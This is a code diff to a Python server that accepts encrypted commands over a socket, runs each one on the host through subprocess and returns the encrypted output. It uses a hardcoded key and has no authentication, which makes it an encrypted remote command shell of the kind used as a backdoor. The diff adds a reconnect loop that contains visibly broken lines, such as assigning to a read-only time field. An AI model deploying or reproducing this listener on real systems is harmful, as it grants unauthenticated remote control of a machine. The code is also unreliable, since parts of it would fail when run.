@@ -1,7 +1,7 @@
 import socket
 import subprocess
 from cryptography.fernet import Fernet
-
+import time
 
 key = b'TQenjgBHJFv6Ep4v8eN0Bayf194BS6qV_X23n5ulnRQ='
 
@@ -22,26 +22,35 @@ def server_program():
     f = Fernet(key)
 
     while True:
-        # receive data stream. it won't accept data packet greater than 1024 bytes
-        data = conn.recv(1024).decode()
-        if not data:
-            # if data is not received break
-            break
-        data = f.decrypt(str(data))
-        print("from connected user: " + str(data))
-        command = str(data)
-        
-        # before running commands auth using AES
-        # we need a private key
-        
-        result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout_output = result.stdout.decode("utf-8")
-        stderr_output = result.stderr.decode("utf-8")
-        res = f.encrypt(stdout_output)
-        conn.send(res.encode())  # send data to the client
+        curr_time = time.localtime()
+        print('retrying connection at: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)
 
-    conn.close()  # close the connection
+        while True:
+            # receive data stream. it won't accept data packet greater than 1024 bytes
+            data = conn.recv(1024).decode()
+            if not data:
+                # if data is not received break
+                break
+            data = f.decrypt(data)
+            print("from connected user: " + str(data))
+            command = str(data)
+            
+            # before running commands auth using AES
+            # we need a private key
+            
+            result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout_output = result.stdout.decode("utf-8")
+            stderr_output = result.stderr.decode("utf-8")
+            res = f.encrypt(stdout_output)
+            conn.send(res.encode())  # send data to the client
 
+        conn.close()  # close the connection
+        # wait at least a minute before retrying the connection
+        curr_time.tm_min += 1
+        while curr_time < time.localtime():
+            time.sleep(15)
+            print('current time: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)
+            
 
 if __name__ == '__main__':
     server_program()
